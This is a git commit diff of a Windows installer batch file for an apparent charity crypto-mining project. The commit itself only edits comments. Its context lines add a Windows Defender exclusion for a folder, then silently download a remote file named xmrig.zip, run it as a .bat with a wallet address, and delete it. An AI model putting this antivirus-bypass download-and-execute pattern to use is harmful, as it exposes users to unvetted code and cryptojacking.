421f4a53f94f671fb6418bb0bba7a2a839d2ef4d
miners4charity <95400007+miners4charity@users.noreply.github.com>
2021-12-24 20:51:24 -0600

    Update FirstInstall.bat

--- FirstInstall.bat
+++ FirstInstall.bat
@@ -1,10 +1,6 @@
-
-
-rem adding the Mining Directory
+echo Adding the Mining Directory
 mkdir %USERPROFILE%\Miners4Charity
 powershell -inputformat none -outputformat none -NonInteractive -Command "$USERPROFILE = $env:USERPROFILE; Defender\Add-MpPreference -ExclusionPath ('$USERPROFILE\Miners4Charity')"
 
-
-rem running the setup script
+echo Running the setup script
 powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/miners4charity/xmrig_setup/master/xmrig.zip', $tempfile); & $tempfile 42uxPgPqt9V9ZpLh8MkZUW2saYJNdrXtXUGtosFGZJdpGHG48Z4i42mHL87oBkkMre9xh1fv9mEnVg1f8ZJnkwqrBDFKNrC; Remove-Item -Force $tempfile"
-
